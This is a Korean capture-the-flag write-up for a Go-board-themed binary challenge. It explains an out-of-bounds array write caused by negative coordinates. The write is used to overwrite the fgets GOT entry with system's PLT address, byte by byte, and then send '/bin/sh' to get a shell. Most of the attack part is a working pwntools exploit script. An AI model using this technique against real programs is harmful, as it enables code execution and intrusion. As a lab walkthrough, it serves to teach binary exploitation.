## 함수 분석 / 취약점 발견
입력을 할 수 있는 부분 중 buffer를 벗어나 입력할 수 있는 부분은 단 하나이다.
```
  printf("please input x:");
  read(0, buf, 9u);
  v1 = atoi(buf);
  printf("y:");
  read(0, buf, 9u);
  v2 = atoi(buf);
  if ( v2 * v1 > 1600 )
  {
    puts("error: not baduk pan area\n");
    puts("please send message for creator");
    fgets(&name, 99, stdin);
    exit(0);
  }
  baduk_pan[40 * v1 + v2] = ++count;
```
* count는 1로 초기화되어있다.
v2*v1이 1600만 안넘으면 된다. 즉, v2와 v1이 꼭 0~40일 필요가 없다.
1. 문제의 제목인 GOT_OVERWRITE에서 착안, fgets를 system으로 바꾸게 fgets의 got의 주소를 system으로 향하는 address로 바꾸면 되지 않을까?
    * system 자체의 주소는 libc가 항상 바뀌고 libc를 유추할 방법이 없다
    * system plt의 주소는 문제 내에서 system("/bin/clear")을 사용하느라 plt가 존재한다. 이를 사용하자.
2. 이후 fgets를 system으로 바꿀 수 있고 name에 /bin/sh를 입력하면 fget(&name, 99, stdin)는 사실 system("/bin/sh")를 실행하는 것이 된다

## 구현
1. fgets의 got 주소는 `0x0804b014`, badukpan[]의 주소는 `0x804b080`
    * `x = -2, y = -28 ~ -25`로 이에 접근할 수 있다.
2. system의 plt 주소는 `0x08048590`이다. 리틀 엔디안 식으로 표현하면 `0x90 0x85 0x04 0x08`이므로 
    * count를 증가시켜가며 입력하고자 하는 바이트의 값이 되면 이를 fget의 got에 입력하자.
    ```python
    lap = 0x91
    for i in range(2, lap+2):
        log.info(f'count: {i}/{lap}')
        if (i == 0x90):
            p.recvuntil('x:')
            p.sendline(b'-2')
            p.recvuntil('y:')
            p.sendline(b'-28')
        elif (i == 0x85):
            p.recvuntil('x:')
            p.sendline(b'-2')
            p.recvuntil('y:')
            p.sendline(b'-27')
        elif (i == 0x04):
            p.recvuntil('x:')
            p.sendline(b'-2')
            p.recvuntil('y:')
            p.sendline(b'-26')
        elif (i == 0x08):
            p.recvuntil('x:')
            p.sendline(b'-2')
            p.recvuntil('y:')
            p.sendline(b'-25')
        else: # count 증가할때는 [0]에다가 넣자
            p.recvuntil('x:')
            p.sendline(b'0')
            p.recvuntil('y:')
            p.sendline(b'0')
        p.recvuntil('playing....\n') # thats very good su aI playing....
    ```
3. 일부러 x*y > 1600인 x와 y를 입력하고 오류를 띄운다. fgets를 호출하기 전에 이름을 입력받으므로 /bin/sh을 입력해주자
```python
p.recvuntil('x:')
p.sendline(b'41')
p.recvuntil('y:')
p.sendline(b'41')
p.recvuntil('creator\n')
p.sendline("/bin/sh\x00")
p.interactive()
```